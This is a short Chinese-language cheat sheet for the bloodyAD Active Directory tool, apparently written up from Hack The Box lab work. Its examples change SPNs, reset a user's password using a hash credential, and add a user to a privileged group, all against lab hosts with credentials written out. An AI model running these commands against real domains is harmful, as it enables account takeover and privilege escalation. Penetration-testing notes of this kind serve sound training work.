# bloodyad 工具使用

```bash
# 项目地址：
https://github.com/CravateRouge/bloodyAD
```

## 修改 SPN 名

```bash
# 删除 SPN
bloodyad --host [IP/HOST] -d [Domian] -u [User] -p [Pass] msldap delspn [DN] [SPN]
# 示例
bloodyad --host 10.129.183.153 -d pirate.htb -u 'A.WHITE_ADM' -p 'Admin@123' msldap delspn 'CN=WEB01,CN=COMPUTERS,DC=PIRATE,DC=HTB' 'HTTP/WEB01'

# 添加 SPN
bloodyad --host [IP/HOST] -d [Domian] -u [User] -p [Pass] msldap addspn [DN] [SPN]
# 示例
bloodyad --host 10.129.183.153 -d pirate.htb -u 'A.WHITE_ADM' -p 'Admin@123' msldap addspn 'CN=DC01,OU=DOMAIN CONTROLLERS,DC=PIRATE,DC=HTB' 'HTTP/WEB01'
```

## 修改用户密码

```bash
# 修改用户密码
bloodyad --host [IP/HOST] -d [Domian] -u [User] -p [Pass] set password [user] [password]
# 示例
bloodyAD --host "10.129.18.180" -d "tombwatcher.htb" -u "ansible_dev$" -p ":bf8b11e301f7ba3fdc616e5d4fa01c30" set password "sam" "nihao#123"
```

## 将用户添加至某个组

```bash
# 添加组
bloodyad --host [IP/HOST] -d [Domian] -u [User] -p [Pass] add groupMember [group] [member]
# 示例
bloodyAD --host 10.129.18.180 -d "tombwatcher.htb" -u "Alfred" -p "basketball" add groupMember "INFRASTRUCTURE" "Alfred"
# 通过 rpc 验证是否添加成功
net rpc group members "INFRASTRUCTURE" -U "tombwatcher.htb"/"Alfred"%"basketball" -S "DC01.tombwatcher.htb"
```